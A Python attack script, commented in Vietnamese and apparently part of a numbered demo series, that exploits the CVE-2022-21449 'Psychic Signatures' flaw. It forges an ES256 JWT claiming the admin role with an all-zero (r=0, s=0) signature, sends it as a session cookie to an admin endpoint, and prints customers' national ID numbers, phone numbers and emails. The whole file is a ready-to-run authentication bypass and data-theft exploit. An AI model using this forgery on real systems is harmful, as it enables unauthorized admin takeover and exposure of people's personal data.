"""TẤN CÔNG 2 — PSYCHIC SIGNATURES / CVE-2022-21449 (qua HTTP, API công khai thật).

Chế tạo token phiên với chữ ký RỖNG (r=0, s=0). Hàm xác minh token của server bỏ
bước kiểm tra r,s ∈ [1,n-1] nên chấp nhận → chiếm quyền admin, lộ toàn bộ hồ sơ
khách hàng (CCCD, SĐT, email) mà KHÔNG cần mật khẩu.

    python attack_psychic.py
"""
import json

from common import get, b64u


def forge_admin_token():
    header = {"alg": "ES256", "typ": "JWT"}
    payload = {"user": "attacker", "role": "admin"}
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64u(b"\x00" * 64)                 # r = s = 0
    return f"{h}.{p}.{sig}"


def main():
    print("=== Tấn công 2: PSYCHIC SIGNATURES (chữ ký (0,0)) ===")

    st, _ = get("/api/admin/users")
    print(f"Truy cập /api/admin/users khi chưa đăng nhập → HTTP {st} (bị từ chối).")

    token = forge_admin_token()
    st, res = get("/api/admin/users", cookie=f"session_token={token}")
    print(f"Gửi lại kèm token chữ ký (0,0) → HTTP {st}.")
    if st != 200 or not isinstance(res, dict):
        print("Không vượt qua được xác thực.")
        return

    accts = res["accounts"]
    print(f"Chiếm quyền admin, lộ {len(accts)} hồ sơ khách hàng (không cần mật khẩu):")
    for a in accts[:8]:
        print(f"  {a['user']:<10} {a.get('name',''):<18} {a.get('cccd','')}  "
              f"{a.get('phone','')}  {a.get('email','')}")
    if len(accts) > 8:
        print(f"  ... và {len(accts) - 8} hồ sơ khác")


if __name__ == "__main__":
    main()
